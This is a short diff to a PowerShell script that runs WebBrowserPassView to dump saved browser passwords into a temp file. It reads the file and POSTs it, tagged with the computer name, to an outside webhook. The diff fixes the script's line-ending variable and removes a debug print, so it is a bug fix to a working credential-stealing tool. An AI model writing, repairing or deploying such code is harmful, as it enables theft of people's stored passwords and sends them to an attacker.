@@ -22,7 +22,7 @@ Start-Process -FilePath 'wbpv\WebBrowserPassView.exe' -Args '/stext wbpv\pwd.txt
 $fileBytes = [System.IO.File]::ReadAllBytes(($env:temp + '\wbpv\pwd.txt'));
 $fileContent =  [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
 $boundary = [System.Guid]::NewGuid().ToString();
-$LF = """`r`n""";
+$LF = "`r`n";
 
 $data = @{
     'username' = $env:COMPUTERNAME;
@@ -47,8 +47,6 @@ $body = (
     $fileContent,
     ('--' + $boundary + '--' + $LF)
 ) -join $LF;
-
-Write-Output $body
 
 Invoke-WebRequest -Uri $hook -ContentType ('multipart/form-data; boundary=' + $boundary) -Method Post -Body $body;
 
